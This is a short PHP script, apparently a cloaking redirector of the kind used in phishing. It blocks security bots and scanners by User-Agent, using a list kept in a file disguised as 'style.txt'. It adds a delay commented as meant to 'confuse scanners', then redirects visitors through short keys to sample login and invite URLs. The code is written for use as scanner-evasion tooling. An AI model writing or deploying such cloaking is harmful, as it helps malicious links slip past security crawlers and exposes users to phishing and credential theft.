<?php
// Hardened redirector
// Block known bots/scanners by User-Agent
$botAgents = file('style.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

foreach ($botAgents as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        http_response_code(403);
        exit("Access Denied");
    }
}

// Define your links (you can move this to a database if needed)
// Change the id to any random alphanumericals
$links = [
    'abc123' => 'https://secure-site.com/login',
    'xyz456' => 'https://some-app.com/invite',
];

$key = $_GET['l'] ?? '';

if (!isset($links[$key])) {
    http_response_code(404);
    exit("Not Found");
}

// Optional: Delay to confuse scanners
usleep(300000); // 300ms

// Redirect
header("Location: " . $links[$key], true, 302);
exit;
?>